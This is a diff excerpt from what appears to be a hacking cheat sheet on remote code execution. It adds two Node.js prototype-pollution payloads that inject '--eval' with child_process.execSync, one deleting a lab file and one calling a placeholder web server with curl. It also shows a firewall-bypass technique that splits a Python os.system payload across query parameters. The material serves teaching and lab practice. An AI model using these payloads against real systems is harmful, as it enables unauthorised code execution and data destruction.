@@ -73,6 +73,18 @@ RCE payload into chunks, like so:
 GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
 Host: example.com
 
+Via prototype pollution
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+}
+
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://<your web server>')"
+    ]
+}
 The parameters will get through the firewall without issue, since the request technically doesn’t contain the string system. But when the server
 processes the request, the parameter values will be concatenated into a single string that forms our RCE payload: "__import__('os').system('ls')".
 This is only a tiny subset of filter bypasses you can try; many more exist. For example, you can hex-encode, URL-encode, double-URL-encode, and
